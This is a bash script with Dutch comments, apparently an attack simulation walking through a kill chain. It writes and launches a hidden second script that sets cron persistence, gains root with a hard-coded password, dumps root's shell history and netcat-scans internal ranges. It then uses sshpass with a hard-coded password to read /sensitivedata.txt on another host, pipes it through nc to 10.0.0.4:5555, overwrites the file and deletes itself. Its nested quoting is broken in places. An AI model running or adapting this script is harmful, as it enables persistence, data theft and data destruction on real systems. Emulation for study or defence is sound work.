#!/bin/bash

# idee:
# dit script wordt al gerund door een user genaamd john

echo "
#!/bin/bash

###real malware script

bash -c'cat >> /crontab.txt << EOF
* * * * * bash .test.sh &
EOF
$ crond -c /crontab.txt'

### cracking password, priv esc
# root password is root

### persistence
su - root <<! >/dev/null 2>&1
root
bash -c 'cat >> /crontab.txt << EOF
* * * * * bash .test.sh &
EOF
$ crond -c /crontab.txt'
!

### found creds, lateral movement
su - root <<! >/dev/null 2>&1
root
cat /root/.ash_history > /dev/tty
!

# netcat scan network
# local IP addresses
# ip address found in getmail script

echo "
is_alive_ping()
{
  ping -c 1 $1 > /dev/null
  test=$?
  [ $test -eq 0 ] && echo $i | read ips
  for j in $(seq 1 1000)
  do
  [ $test -eq 0 ] && nc -n -z $i $j
  done
}

for i in 172.16.0.{1..255}
do
is_alive_ping $i & disown
done

is_alive_ping()
{
  ping -c 1 $1 > /dev/null
  test=$?
  [ $test -eq 0 ] && echo $i
  for j in $(seq 1 1000)
  do
  [ $test -eq 0 ] && nc -n -z $i $j
  done
}

for i in 192.168.{1..255}.{1..255}
do
is_alive_ping $i & disown
done
echo 'done with .test2.sh'
" > .test2.sh

bash .test2.sh

sleep 3

# found ssh commando in command log
### collect ftp data, collection
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'ls /*'
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'cat /sensitivedata.txt'

### download data exfiltration
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'cat /sensitivedata.txt | nc 10.0.0.4 5555'

### delete of encrypt data impact
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'echo "fake sensitivedata" > /sensitivedata.txt'

" > .test.sh

bash .test.sh &

rm -f malware.sh